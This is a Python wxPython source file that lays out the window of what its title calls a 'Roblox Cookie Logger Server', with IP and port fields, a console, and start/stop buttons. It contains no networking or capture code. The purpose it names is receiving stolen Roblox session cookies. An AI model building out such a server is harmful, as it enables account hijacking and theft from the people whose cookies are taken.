import wx


class GUIserver(wx.Frame):
    def __init__(self, *args, **kwds):
        ''' initialing '''
        kwds["style"] = kwds.get("style", 0) | wx.DEFAULT_FRAME_STYLE
        wx.Frame.__init__(self, *args, **kwds)
        self.SetSize((600, 600))

        self.panel = wx.Panel(self, wx.ID_ANY)
        self.tbConsole = wx.TextCtrl(
            self.panel, wx.ID_ANY, "", style=wx.HSCROLL | wx.TE_MULTILINE | wx.TE_READONLY)

        ''' buttons '''
        self.btnStart = wx.Button(
            self.panel, wx.ID_ANY, "Run server"
        )
        self.btnStop = wx.Button(
            self.panel, wx.ID_ANY, "Stop server"
        )

        ''' text ctrls '''
        self.tbIP = wx.TextCtrl(self.panel, wx.ID_ANY,
                                'localhost')
        self.tbPORT = wx.TextCtrl(self.panel, wx.ID_ANY, "8888")

        self.__set_properties()
        self.__do_layout()

    def __set_properties(self):
        self.SetTitle("[GUI] Roblox Cookie Logger Server")
        self.SetBackgroundColour(wx.Colour(255, 255, 255))
        self.panel.SetBackgroundColour(wx.Colour(255, 255, 255))

    def __do_layout(self):
        sizer_1 = wx.BoxSizer(wx.VERTICAL)
        sizer_2 = wx.BoxSizer(wx.VERTICAL)

        lblIP = wx.StaticText(self.panel, wx.ID_ANY, "IP")
        sizer_2.Add(lblIP, 0, wx.TOP, 5)
        sizer_2.Add(self.tbIP, 0, wx.EXPAND, 0)

        lblPORT = wx.StaticText(self.panel, wx.ID_ANY, "PORT")
        sizer_2.Add(lblPORT, 0, wx.TOP, 5)
        sizer_2.Add(self.tbPORT, 0, wx.EXPAND, 0)

        # Console
        lbConsole = wx.StaticText(self.panel, wx.ID_ANY, "Console")
        sizer_2.Add(lbConsole, 0, wx.TOP, 5)
        sizer_2.Add(self.tbConsole, 1, wx.EXPAND, 0)

        # turn on/off buttons
        sizer_2.Add(self.btnStart, 0, wx.EXPAND | wx.TOP, 5)
        sizer_2.Add(self.btnStop, 0, wx.EXPAND | wx.TOP, 5)

        ''' Layouts '''
        self.panel.SetSizer(sizer_2)
        sizer_1.Add(self.panel, 1, wx.ALL | wx.EXPAND, 5)
        self.SetSizer(sizer_1)
        self.Layout()


class MyApp(wx.App):
    def OnInit(self):
        self.Window = GUIserver(None, wx.ID_ANY, "")
        self.SetTopWindow(self.Window)
        self.Window.Show()
        return True


if __name__ == "__main__":
    app = MyApp(0)
    app.MainLoop()
